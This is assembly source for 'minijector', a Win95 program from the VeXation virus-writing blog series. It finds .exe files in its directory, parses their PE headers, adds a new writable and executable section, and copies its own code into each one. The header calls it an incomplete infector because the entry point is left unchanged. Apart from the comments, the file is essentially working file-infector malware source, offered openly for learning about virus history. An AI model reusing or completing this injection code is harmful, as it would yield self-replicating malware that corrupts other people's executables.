;
; (C) CPU - 28-01-2019
;
; Part of VeXation - https://log.vexation.com
;
; Minijector is a small x86 Win95 program that will find and "infect" .exe files
; in the same directory as minijector.exe is run from. This is NOT a complete working
; file infector. It will only add a new code section to the target with virus code.
; The target entrypoint is not updated and the injected code will not work. This
; program is provided to demonstrate work in progress.
;
; Usage: `make run` to debug minijector.exe infecting calc.exe
;
.386
warn pro
locals
.model flat, stdcall
assume fs:nothing

include windows.inc
include minijector.inc

.data
; Data used by FindFirstFile and FindNextFile
findHandle          HANDLE 0
findData            WIN32_FIND_DATA <0>
infectFilter        BYTE 2ah,2eh,65h,78h,65h,0h ; '*.exe\0'

; Data used for memory mapping target files
targetFile          DB WIN32_MAX_PATHLEN dup(0)
targetFileHandle    HANDLE 0
targetFileSize      DD 0
targetMapHandle     HANDLE 0
targetP             DD 0

; Data used for important target file offsets/values
sectionAlignment    DD 0
fileAlignment       DD 0
segHeaders          DD 0
lastSegHeader       DD 0
numberOfSections    DD 0
firstSegStart       DD 0

; Data used during injection
injectStart         DD 0
injectSize          DD 0
newSegName          BYTE 2eh,69h,72h,65h,6ch,6fh,63h,0h ; '.ireloc\0'
newSegNameEnd:

.code
start:
viral_payload:

findfirst:
  mov eax, offset infectFilter
  mov ebx, offset findData
  call FindFirstFileA, eax, ebx

  ; If we got an invalid handle from FindFirstFileA that means there were no EXEs 
  ; in the directory. Jump to error to handle this case
  cmp eax, INVALID_HANDLE_VALUE
  je error
  mov [findHandle], eax

targetfound:
  ; Otherwise we have a potential .exe target to examine
  ; Copy the name of the file from the find data to our targetFile var.
  mov eax, offset targetFile
  mov ebx, offset findData.cFileName
  call lstrcpy, eax, ebx
  cmp eax, 0h
  je error
  ; If there was no error, map the target file.
  jmp mapfile

; If we're here it means the targetFile wasn't any good. 
; Time to look at the next available .exe file using FindNextFile
findnext:
  mov eax, [findHandle]
  mov ebx, offset findData
  call FindNextFileA, eax, ebx
  cmp eax, 0h
  je error
  ; If there was no error, we found a potential target. Jump back
  ; to targetFound.
  jmp targetfound

; We found a targetfile and need to map it to examine whether its a good PE file.
mapfile:
  ; Open a file handle to the targetFile. Use READ + WRITE so we can modify the
  ; file easily if it turns out to be infectable.
  ; TODO(@cpu): Ideally we would also check that the file isn't marked Read Only.
  ;             If it is read only we would need to remove that attribute first.
  mov eax, offset targetFile
  call CreateFileA, \
         eax,\
         GENERIC_READ + GENERIC_WRITE,\
         0h,\
         0h,\
         OPEN_EXISTING,\
         FILE_ATTRIBUTE_NORMAL,\
         0h
  cmp eax, INVALID_HANDLE_VALUE
  je findnext
  mov [targetFileHandle], eax

  ; Get the target file's original size
  call GetFileSize, eax, 0
  cmp eax, INVALID_HANDLE_VALUE
  je findnext
  mov [targetFileSize], eax

  ; The target file should at least be big enough for a full IMAGE_DOS_HEADER
  cmp eax, size IMAGE_DOS_HEADER
  jle error

  ; Create a read/write file mapping for the entire targetFile
  ; TODO(@cpu): I could probably be more surgical here and only map the
  ;             area of the PE file that is manipulated on the first pass.
  mov eax, [targetFileHandle]
  call CreateFileMappingA, \
         eax,\
         0h,\
         PAGE_READWRITE,\
         0h,\
         0h,\
         0h
  cmp eax, 0h
  je findnext
  mov [targetMapHandle], eax

  ; Map the entire targetFile into memory
  call MapViewOfFile, \
    eax,\
    FILE_MAP_WRITE,\
    0h,\
    0h,\
    0h
  cmp eax, 0h
  je findnext
  mov [targetP], eax

; With the target EXE mapped into memory we can start checking it out
@@checkdosheader:
  ; Check that we have a DOS header by looking for the IMAGE_DOS_SIGNATURE
  ; (the magic MZ bytes) at the expected offset
  cmp (IMAGE_DOS_HEADER [eax]).e_magic, IMAGE_DOS_SIGNATURE
  jnz findnext

  ; Advance past the end of the IMAGE_DOS_HEADER structure to the
  ; IMAGE_NT_HEADERS
  add eax, (IMAGE_DOS_HEADER [eax]).e_lfanew

  ; Check that the offset specifed by e_lfanew isn't out of bounds for the 
  ; file size
  mov ecx, eax
  sub ecx, [targetP]
  cmp ecx, [targetFileSize]
  jge findnext

  ; Check that there is enough room for an IMAGE_NT_HEADER
  add ecx, size IMAGE_NT_HEADERS
  cmp ecx, [targetFileSize]
  jge findnext
   
@@checkpeheader:
  ; Check that we have a PE header by looking for the right magic
  ; bytes (PE) at the expected offset
  cmp (IMAGE_NT_HEADERS [eax]).Signature, IMAGE_NT_SIGNATURE
  jnz findnext

@@checksubsystem:
  ; We only want to infect GUI or Console apps, not device drivers, 
  ; WinCE apps, etc
  cmp (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_GUI
  jz @@checkmachine
  cmp (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_CUI
  jnz findnext

@@checkmachine:
  ; We need to verify the PE is targetting a i386 machine.
  cmp (IMAGE_NT_HEADERS [eax]).FileHeader.Machine, IMAGE_FILE_MACHINE_I386
  jnz findnext

; At this point we've decided we have found a valid i386 PE and we can
; analyze it for infection.
@@analyzepe:
  ; Copy the alignment values somewhere safe
  mov ecx, (IMAGE_NT_HEADERS [eax]).OptionalHeader.SectionAlignment
  mov [sectionAlignment], ecx
  mov ecx, (IMAGE_NT_HEADERS [eax]).OptionalHeader.FileAlignment
  mov [fileAlignment], ecx

  ; Copy down how many sections it has
  mov cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
  movzx ecx, cx
  ; If there are zero sections, something is fucky, move on
  cmp ecx, 0h
  je findnext
  mov [numberOfSections], ecx

  ; Move ahead to the section table
  add eax, size IMAGE_NT_HEADERS

  ; Check that the pointer is still within the file size
  mov ecx, eax
  sub ecx, [targetP]
  cmp ecx, [targetFileSize]
  jge findnext

  ; Check that the last segment specified is within the file size
  mov ecx, [numberOfSections]
  mov edx, size IMAGE_SECTION_HEADER
  imul ecx, edx
  mov ebx, eax
  add ebx, ecx
  sub ebx, [targetP]
  cmp ebx, [targetFileSize]
  jge findnext

  ; Save the location of the first section header
  mov [segHeaders], eax

  ; The last segment header should be at an offset:
  ;   sizeof IMAGE_SECTION_HEADER * numberOfSections - 1
  mov ecx, [numberOfSections]
  dec ecx
  mov edx, size IMAGE_SECTION_HEADER
  imul ecx, edx

  ; Its an RVA from targetP so offset by eax
  mov edx, eax
  add ecx, edx

  ; Store the location of the last segment header
  mov [lastSegHeader], ecx

; We don't want to reinfect a file. Check if the last segment's name is 
; equal to newSegName. If it is, move on.
@@checkforinfection: 
  ; Save register state so if this check passes we can easily restore
  pusha
    ; Compare the last segment's name with the newSegName
    mov esi, ecx
    mov edi, offset newSegName
    mov ecx, newSegNameEnd - newSegName
    repz cmpsb
    ; If it is equal, then we've already infected this file.
    ; Find a different one
    jz findnext
  popa

  ; Check there is room for a new seg header. We can tell if there's no
  ; room if the end of the IMAGE_SECTION_HEADER is larger than the first section's
  ; pointer to raw data.
  ; TODO(@CPU): The above is only true most of the time... A better idea (more work...)
  ; would be to search all of the section header's for the one with the lowest
  ; PointerToRawData and check against it. Ignoring for now because this is super
  ; corner-casey and I'm a bit lazy!
  mov ebx, [lastSegHeader]
  add ebx, size IMAGE_SECTION_HEADER
  mov edx, [segHeaders]
  mov edx, (IMAGE_SECTION_HEADER [edx]).PointerToRawData
  add edx, [targetP]
  cmp ebx, edx
  jge findnext

; Create a new section header for our injected section by copying
; the target's first section header and then fixing it up.
@@addsegheader:
  mov ecx, size IMAGE_SECTION_HEADER ; Size   = 1 header worth
  mov edi, [lastSegHeader]           ; DEST   = ECX = Last header start
  add edi, ecx                       ; DEST   = Last header end
  mov esi, [segHeaders]              ; Source = First segment header
  mov ebx, edi
@@copyheader:
  lodsb
  stosb
  dec ecx
  jnz @@copyheader

; We need to customize the header we just copied
@@fixupheader:
  ; Move back to the beginning of the new header
  sub edi, size IMAGE_SECTION_HEADER

  ; Fix the segment name by writing newSegName on top of the old name
  mov eax, offset newSegName
  call lstrcpy, edi, eax
  cmp eax, 0h
  je findnext

  ; Fix the VirtualSize, ensuring its a multiple of the section alignment
  mov eax, viral_payload_size
  sub eax, 1
  xor edx, edx
  div [sectionAlignment]
  add eax, 1
  mul [sectionAlignment]
  mov (IMAGE_SECTION_HEADER [edi]).VirtualSize, eax

  ; Fix the virtual address, again ensuring section alignment
  mov ecx, [lastSegHeader]
  mov eax, (IMAGE_SECTION_HEADER [ecx]).VirtualSize
  mov ecx, (IMAGE_SECTION_HEADER [ecx]).SecHdrVirtualAddress
  add eax, ecx
  sub eax, 1
  xor edx, edx
  div [sectionAlignment]
  add eax, 1
  mul [sectionAlignment]
  mov [edi].SecHdrVirtualAddress, eax

  ; Back at the start of the PE file fix the section count
  mov ecx, [targetP]
  add ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew
  mov eax, [numberOfSections]
  ; Increment the number of sections
  inc eax
  ; Set the number of sections to the new number
  mov (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax

  ; Fix the raw data size, ensuring it is a multiple of the file alignment
  mov eax, viral_payload_size
  sub eax, 1
  xor edx, edx
  div [fileAlignment]
  add eax, 1
  mul [fileAlignment]
  mov (IMAGE_SECTION_HEADER [edi]).SizeOfRawData, eax

  ; Fix the raw data pointer - this should point to the beginning of the
  ; new section, which is located right after the end of the current last
  ; section. Adding the last section's PointerToRawData (the start of the
  ; last section) to SizeOfRawData gives us this address.
  mov ebx, [lastSegHeader]
  mov eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
  add eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
  mov (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax

  ; Save the pointer to raw data and the size of the raw data
  mov eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
  mov [injectStart], eax
  mov eax, (IMAGE_SECTION_HEADER [edi]).SizeOfRawData
  mov [injectSize], eax

  ; Fix the section flags. Notably we want this to be both EXECUTE and WRITE
  mov ecx, IMAGE_SCN_MEM_READ + \
           IMAGE_SCN_MEM_WRITE + \
           IMAGE_SCN_MEM_EXECUTE + \
           IMAGE_SCN_CNT_CODE
  mov (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx

; We've added a section header to the file. Time to unmap & remap with an inflated 
; size big enough to fit the new section contents.
@@cleanup:
  ; Unmap the target
  mov eax, [targetP]
  call UnmapViewOfFile, eax
  cmp eax, 0h
  je error

  ; Close the map handle
  mov eax, [targetMapHandle]
  call CloseHandle, eax
  cmp eax, 0h
  je error

  ; NOTE(@CPU): We don't close the target file handlehere because we can reuse it
  ; for the remap operation.

  ; Calculate the new size we should map. This is the old target size + 
  ; the size of the new section on-disk
  mov eax, [targetFileSize]
  mov ecx, [injectSize]
  add eax, ecx
  mov ebx, [targetFileHandle]

  ; Memory map the target PE file again with this new size
  call CreateFileMappingA, \
         ebx,\
         0h,\
         PAGE_READWRITE,\
         0h,\
         eax,\
         0h
  cmp eax, 0h
  je error
  ; Save a handle to the new memory map
  mov [targetMapHandle], eax

  ; Map a full view of the resized PE
  call MapViewOfFile, \
         eax,\
         FILE_MAP_WRITE,\
         0h,\
         0h,\
         0h
  cmp eax, 0h
  je error
  mov [targetP], eax

  ; zero the new segment area we'll write - this makes debugging much easier
  ; and ensures we don't put random bits of the host's memory into each new 
  ; infection.
  pusha
    mov edi, eax
    add edi, [injectStart]
    mov ecx, [injectSize]
    @@loopcopy:
      mov eax, 0h
      stosb
    loop @@loopcopy
  popa

; Time to write the new section content with our own code
@@startcopyviruscode:
  ; Destination: the start of our section in targetP
  mov edi, eax
  add edi, [injectStart]
  ; Source: the beginning of the virus code
  mov esi, offset viral_payload
  ; Number of bytes to copy: size of the injected section
  mov ecx, [injectSize]
; Copy the virus code into place
@@copyviruscode:
  rep movsb

; All done! Clean up again closing handles/maps
@@cleanupagain:
  ; Unmap the target file
  mov eax, [targetP]
  call UnmapViewOfFile, eax
  cmp eax, 0h
  je error

  ; Close the memory map handle
  mov eax, [targetMapHandle]
  call CloseHandle, eax
  cmp eax, 0h
  je error

  ; Close the file handle
  mov eax, [targetFileHandle]
  call CloseHandle, eax
  cmp eax, 0h
  je error

; Woohoo. The file is now infected with a new segment containing our virus. Nice!
@@finishedinfection:
  ; Move on to other targets
  jmp findnext

; If we're here something has gone wrong or there is no more work to do.
; Try to use ExitProcess to terminate gracefully.
error:
exit: 
  call ExitProcess, 0h, eax

; Use the `$` assembler macro for the current address at this point in the assembly
; process to calculate the virus size by subtracting the start address label.
viral_payload_size EQU $ - viral_payload

end_viral_payload:
end start
; TODO(@CPU): Is this `public` needed?
public start
end
